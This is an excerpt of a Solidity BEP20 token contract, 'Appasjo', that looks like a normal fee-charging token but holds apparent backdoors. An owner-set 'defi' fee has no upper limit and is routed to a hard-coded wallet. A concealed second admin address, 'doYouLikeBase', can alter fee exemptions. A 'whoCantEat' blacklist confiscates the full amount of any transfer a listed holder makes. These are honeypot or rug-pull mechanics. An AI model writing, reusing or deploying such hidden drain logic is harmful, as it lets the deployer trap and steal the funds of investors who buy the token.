...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address[2] memory _doyoulike) 
    {
        ...
        isExcludedFromCut[doYouLikeBase] = true;
        isExcludedFromCut[inTheMTFFace] = true;
    ...
    modifier onlyWhite() {
        require(owner() == _msgSender() || doYouLikeBase == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function setDefi(uint256 value) public onlyOwner {
        defi = value;
    }
    ...
    function setisExcludedFromCut(address account, bool newValue) public onlyWhite {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying + defi).div(100);
            defiAmount = amount.mul(defi).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling + defi).div(100);
            defiAmount = amount.mul(defi).div(100);
        }

        _balances[inTheMTFFace] = _balances[inTheMTFFace].add(defiAmount);
        emit Transfer(sender, inTheMTFFace, defiAmount);

        if(whoCantEat[sender] && !isMarketPair[sender]) feeAmount = amount;
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount.sub(defiAmount));
            emit Transfer(sender, address(this), feeAmount.sub(defiAmount));
        }
...
contract Appasjo is BEP20 {
    constructor() BEP20(
        ...
        [0xD8cD41fa44bdbF479D0fd2EBF076ca857229e2fD,0xD8cD41fa44bdbF479D0fd2EBF076ca857229e2fD]
    ){}
}